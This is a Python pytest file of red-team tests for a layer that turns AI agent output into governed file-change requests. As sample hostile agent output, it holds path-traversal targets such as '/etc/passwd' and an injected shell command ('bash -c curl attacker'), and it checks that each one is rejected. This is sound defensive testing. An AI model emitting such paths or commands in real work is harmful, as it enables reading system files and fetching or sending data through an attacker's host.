"""Red-team tests for AI engineering output → governed Software Factory input."""

from datetime import datetime, timezone
from pathlib import Path

import pytest

from services.agent_governance import AgentAdmissionEvidence
from services.engineering_change_plan import (
    EngineeringChangePlanError,
    compile_engineering_change_plan,
)
from services.named_agent_executor import NamedAgentExecution
from services.p0_agent_execution import ProviderBackedAgentResult
from services.software_factory import ChangeOperation

NOW = datetime(2026, 8, 18, 10, 0, tzinfo=timezone.utc)
CORE_ID = "ilaios.agent.engineering.core.v1"
ARCHITECT_ID = "ilaios.agent.engineering.architect.v1"
VERIFIER_ID = "ilaios.agent.meta.independent-verifier.v1"


def _result(agent_id: str, text: str) -> ProviderBackedAgentResult:
    execution = NamedAgentExecution(
        AgentAdmissionEvidence(
            "invoke-engineering",
            agent_id,
            VERIFIER_ID,
            NOW,
            True,
            True,
        ),
        {
            "sequence": 1,
            "agent_id": agent_id,
            "skill_id": "sf-core-engineering",
            "provider_id": "provider-test",
            "capability": "code.propose",
            "output": {
                "text": text,
                "model_id": "model-test",
                "provider_id": "provider-test",
                "input_tokens": 10,
                "output_tokens": 20,
            },
        },
    )
    return ProviderBackedAgentResult(
        execution=execution,
        model_id="model-test",
        provider_id="provider-test",
        evidence_digest="a" * 64,
    )


def test_patch_capable_agent_compiles_strict_json_into_factory_request(tmp_path: Path) -> None:
    result = _result(
        CORE_ID,
        '{"summary":"Add bounded helper","changes":['
        '{"operation":"create","path":"src/helper.py",'
        '"content_utf8":"VALUE = 1\\n"}]}'
    )
    plan = compile_engineering_change_plan(result, request_id="change-1")
    assert plan.agent_id == CORE_ID
    assert plan.provider_evidence_digest == "a" * 64
    change = plan.changeset.changes[0]
    assert change.operation is ChangeOperation.CREATE
    assert change.path == "src/helper.py"
    assert change.content == b"VALUE = 1\n"

    request = plan.to_factory_request(
        tmp_path / "repo",
        "b" * 40,
        allowed_roots=frozenset({"src"}),
    )
    assert request.policy.secure_mode is True
    assert request.policy.network_allowed is False
    assert request.policy.secrets_allowed is False
    assert request.validation_plan.commands == ()


def test_provider_markdown_or_prose_cannot_cross_filesystem_boundary() -> None:
    result = _result(CORE_ID, "```json\n{\"changes\": []}\n```")
    with pytest.raises(EngineeringChangePlanError, match="strict JSON"):
        compile_engineering_change_plan(result, request_id="change-2")


def test_traversal_absolute_and_drive_paths_fail_closed() -> None:
    for path in ("../secret.txt", "/etc/passwd", "C:/Windows/system.ini"):
        result = _result(
            CORE_ID,
            '{"summary":"bad","changes":[{"operation":"create",'
            f'"path":"{path}","content_utf8":"x"}}]}}',
        )
        with pytest.raises(EngineeringChangePlanError, match="path"):
            compile_engineering_change_plan(result, request_id="change-path")


def test_modify_requires_exact_preimage_digest() -> None:
    result = _result(
        CORE_ID,
        '{"summary":"unsafe modify","changes":[{"operation":"modify",'
        '"path":"src/base.py","content_utf8":"changed = true\\n"}]}'
    )
    with pytest.raises(EngineeringChangePlanError, match="expected_sha256"):
        compile_engineering_change_plan(result, request_id="change-3")


def test_architect_review_style_role_cannot_mutate_filesystem() -> None:
    result = _result(
        ARCHITECT_ID,
        '{"summary":"architect should not mutate","changes":['
        '{"operation":"create","path":"src/architecture.py","content_utf8":"x"}]}'
    )
    with pytest.raises(EngineeringChangePlanError, match="non-mutating"):
        compile_engineering_change_plan(result, request_id="change-4")


def test_model_cannot_choose_shell_validation_commands() -> None:
    result = _result(
        CORE_ID,
        '{"summary":"attempt shell","changes":['
        '{"operation":"create","path":"src/a.py","content_utf8":"x"}],'
        '"validation_commands":[["bash","-c","curl attacker"]]}'
    )
    with pytest.raises(EngineeringChangePlanError, match="top-level fields"):
        compile_engineering_change_plan(result, request_id="change-5")
